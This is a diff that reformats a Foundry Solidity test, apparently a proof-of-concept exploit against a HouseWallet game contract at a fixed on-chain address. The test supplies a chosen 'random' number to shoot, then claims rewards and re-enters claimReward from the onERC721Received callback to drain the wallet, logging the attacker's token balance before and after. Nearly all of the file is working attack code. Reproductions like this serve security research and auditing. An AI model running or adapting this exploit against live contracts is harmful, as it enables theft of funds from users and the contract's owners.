@@ -3,19 +3,22 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC721} from "OpenZeppelin/interfaces/IERC721.sol";
+import {IERC721} from "src/interfaces/IERC721.sol";
 
 interface IERC721Receiver {
-
-    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
-        external
-        returns (bytes4);
-
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4);
 }
 
 interface HouseWallet {
-
-    function winners(uint256 id, address player) external view returns (uint256);
+    function winners(
+        uint256 id,
+        address player
+    ) external view returns (uint256);
     function claimReward(
         uint256 _ID,
         address payable _player,
@@ -35,12 +38,11 @@ interface HouseWallet {
         bool nftcheck,
         bool dystopianCheck
     ) external payable;
-
 }
 
 contract ContractTest is Test {
-
-    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
+    HouseWallet houseWallet =
+        HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
     uint256 randomNumber = 12_345_678_000_000_000_000_000_000;
 
     uint256 gameId = 1;
@@ -66,27 +68,58 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_uint("Attacker THBR balance before exploit", THBR.balanceOf(address(this)));
+        emit log_named_uint(
+            "Attacker THBR balance before exploit",
+            THBR.balanceOf(address(this))
+        );
 
-        houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);
+        houseWallet.shoot{value: 0.32 ether}(
+            randomNumber,
+            gameId,
+            feestate,
+            _x,
+            name,
+            _add,
+            nftcheck,
+            dystopianCheck
+        );
         uint256 _amount = houseWallet.winners(gameId, add);
-        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
+        houseWallet.claimReward(
+            gameId,
+            add,
+            _amount,
+            _rewardStatus,
+            _x1,
+            name1,
+            _add
+        );
 
-        emit log_named_uint("Attacker THBR balance after exploit", THBR.balanceOf(address(this)));
+        emit log_named_uint(
+            "Attacker THBR balance after exploit",
+            THBR.balanceOf(address(this))
+        );
     }
 
     receive() external payable {}
 
-    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data)
-        external
-        payable
-        returns (bytes4)
-    {
+    function onERC721Received(
+        address _operator,
+        address _from,
+        uint256 _tokenId,
+        bytes calldata _data
+    ) external payable returns (bytes4) {
         uint256 _amount = houseWallet.winners(gameId, add);
         if (address(houseWallet).balance >= _amount * 2) {
-            houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
+            houseWallet.claimReward(
+                gameId,
+                add,
+                _amount,
+                _rewardStatus,
+                _x1,
+                name1,
+                _add
+            );
         }
         return this.onERC721Received.selector;
     }
-
 }
